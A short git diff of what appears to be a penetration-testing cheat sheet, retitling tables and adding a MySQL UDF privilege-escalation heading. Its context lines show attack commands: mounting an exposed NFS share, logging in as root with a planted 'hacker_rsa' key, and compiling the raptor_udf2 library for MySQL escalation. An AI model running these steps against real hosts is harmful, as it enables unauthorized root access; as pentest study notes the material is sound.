@@ -59,7 +59,7 @@
 
 ### Insecure NFS Share Vulnerabilities
 
-| NFS Exported Shares|
+| How To Do |
 | ------------- |
 | showmount -e 192.168.100.25 #Check if any share is available |
 | mount -t nfs 192.168.100.25:/home /tmp/NFS |
@@ -72,8 +72,9 @@
 |ssh -i /root/.ssh/hacker_rsa root@192.168.1.112|
 
 
+### MySQL Privilge Escalation Through UDF
 
-| MySQL UDF Privilge Escalation  |
+| How To Do |
 | ------------- |
 |gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc|
 | use mysql; |
